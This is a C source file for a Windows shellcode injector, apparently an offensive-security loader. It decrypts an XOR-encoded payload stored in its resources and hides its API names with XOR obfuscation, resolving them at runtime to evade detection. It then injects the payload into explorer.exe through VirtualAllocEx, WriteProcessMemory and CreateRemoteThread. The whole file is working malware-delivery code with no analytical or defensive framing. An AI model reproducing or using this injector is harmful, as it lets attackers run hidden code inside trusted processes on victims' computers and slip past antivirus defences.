
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include "resources.h"


LPVOID (WINAPI * ptrVirtualAllocEx)(
  HANDLE hProcess,
  LPVOID lpAddress,
  SIZE_T dwSize,
  DWORD  flAllocationType,
  DWORD  flProtect
);

BOOL (WINAPI * ptrWriteProcessMemory)(
  HANDLE  hProcess,
  LPVOID  lpBaseAddress,
  LPCVOID lpBuffer,
  SIZE_T  nSize,
  SIZE_T  *lpNumberOfBytesWritten
);

HANDLE (WINAPI * ptrCreateRemoteThread)(
  HANDLE                 hProcess,
  LPSECURITY_ATTRIBUTES  lpThreadAttributes,
  SIZE_T                 dwStackSize,
  LPTHREAD_START_ROUTINE lpStartAddress,
  LPVOID                 lpParameter,
  DWORD                  dwCreationFlags,
  LPDWORD                lpThreadId
);

char encryption_key[] = "secretxorkey";

void DecryptXOR(char * encrypted_data, size_t data_length, char * key, size_t key_length) {
	int key_index = 0;
	
	for (int i = 0; i < data_length; i++) {
		if (key_index == key_length - 1) key_index = 0;

		encrypted_data[i] = encrypted_data[i] ^ key[key_index];
		key_index++;
	}
}

int SearchForProcess(const char *processName) {

        HANDLE hSnapshotOfProcesses;
        PROCESSENTRY32 processStruct;
        int pid = 0;
                
        hSnapshotOfProcesses = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (INVALID_HANDLE_VALUE == hSnapshotOfProcesses) return 0;
                
        processStruct.dwSize = sizeof(PROCESSENTRY32); 
                
        if (!Process32First(hSnapshotOfProcesses, &processStruct)) {
                CloseHandle(hSnapshotOfProcesses);
                return 0;
        }
                
        while (Process32Next(hSnapshotOfProcesses, &processStruct)) {
                if (lstrcmpiA(processName, processStruct.szExeFile) == 0) {
                        pid = processStruct.th32ProcessID;
                        break;
                }
        }
                
        CloseHandle(hSnapshotOfProcesses);
                
        return pid;
}


int ShellcodeInject(HANDLE hProcess, unsigned char * shellcodePayload, unsigned int lengthOfShellcodePayload) {

        LPVOID pRemoteProcAllocMem = NULL;
        HANDLE hThread = NULL;

		char strVirtualAllocEx[] = { 0x25, 0xc, 0x11, 0x6, 0x10, 0x15, 0x14, 0x2e, 0x1e, 0x7, 0xa, 0x1a, 0x36, 0x1d };
		char strWriteProcessMemory[] = { 0x24, 0x17, 0xa, 0x6, 0x0, 0x24, 0xa, 0x0, 0x11, 0xe, 0x16, 0xa, 0x3e, 0x0, 0xe, 0x1d, 0x17, 0xd };
		char strCreateRemoteThread[] = { 0x30, 0x17, 0x6, 0x13, 0x11, 0x11, 0x2a, 0xa, 0x1f, 0x4, 0x11, 0x1c, 0x27, 0xd, 0x11, 0x17, 0x4, 0x10 };
		
		DecryptXOR((char *)strVirtualAllocEx, sizeof(strVirtualAllocEx), encryption_key, sizeof(encryption_key));
		DecryptXOR((char *)strWriteProcessMemory, sizeof(strWriteProcessMemory), encryption_key, sizeof(encryption_key));
		DecryptXOR((char *)strCreateRemoteThread, sizeof(strCreateRemoteThread), encryption_key, sizeof(encryption_key));
		
		ptrVirtualAllocEx = GetProcAddress(GetModuleHandle("Kernel32.dll"), strVirtualAllocEx);
		ptrWriteProcessMemory = GetProcAddress(GetModuleHandle("Kernel32.dll"), strWriteProcessMemory);
		ptrCreateRemoteThread = GetProcAddress(GetModuleHandle("Kernel32.dll"), strCreateRemoteThread);
  
        pRemoteProcAllocMem = ptrVirtualAllocEx(hProcess, NULL, lengthOfShellcodePayload, MEM_COMMIT, PAGE_EXECUTE_READ);
        ptrWriteProcessMemory(hProcess, pRemoteProcAllocMem, (PVOID)shellcodePayload, (SIZE_T)lengthOfShellcodePayload, (SIZE_T *)NULL);
        
        hThread = ptrCreateRemoteThread(hProcess, NULL, 0, pRemoteProcAllocMem, NULL, 0, NULL);
        if (hThread != NULL) {
                WaitForSingleObject(hThread, 500);
                CloseHandle(hThread);
                return 0;
        }
        return -1;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    
	void * alloc_mem;
	BOOL retval;
	HANDLE threadHandle;
    DWORD oldprotect = 0;
	HGLOBAL resHandle = NULL;
	HRSRC res;
	
	unsigned char * shellcodePayload;
	unsigned int lengthOfshellcodePayload;
	
	int pid = 0;
	HANDLE hProcess;
	
	// Retrieve shellcode payload from resources section
	res = FindResource(NULL, MAKEINTRESOURCE(MY_ICON), RT_RCDATA);
	resHandle = LoadResource(NULL, res);
	shellcodePayload = (char *) LockResource(resHandle);
	lengthOfshellcodePayload = SizeofResource(NULL, res);
	
	// Allocate some memory space for shellcodePayload
	alloc_mem = VirtualAlloc(0, lengthOfshellcodePayload, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	//printf("%-20s : 0x%-016p\n", "shellcodePayload addr", (void *)shellcodePayload);
	//printf("%-20s : 0x%-016p\n", "alloc_mem addr", (void *)alloc_mem);

	// Copy shellcodePayload to newly allocated memory
	RtlMoveMemory(alloc_mem, shellcodePayload, lengthOfshellcodePayload);
	
	// Decrypt the XOR payload to Original Shellcode
	DecryptXOR((char *)alloc_mem, lengthOfshellcodePayload, encryption_key, sizeof(encryption_key));
	
	//printf("\nPress Enter to Create Thread!\n");
	//getchar();

    // Injection
	pid = SearchForProcess("explorer.exe");

	if (pid) {
		//printf("mspaint.exe PID = %d\n", pid);

		// try to open target process
		hProcess = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
						PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
						FALSE, (DWORD) pid);

		//printf("\nhProcess = %x\n", hProcess);
		//getchar();
	
		if (hProcess != NULL) {
			ShellcodeInject(hProcess, alloc_mem, lengthOfshellcodePayload);
			CloseHandle(hProcess);
		}
	}
	
	return 0;
}
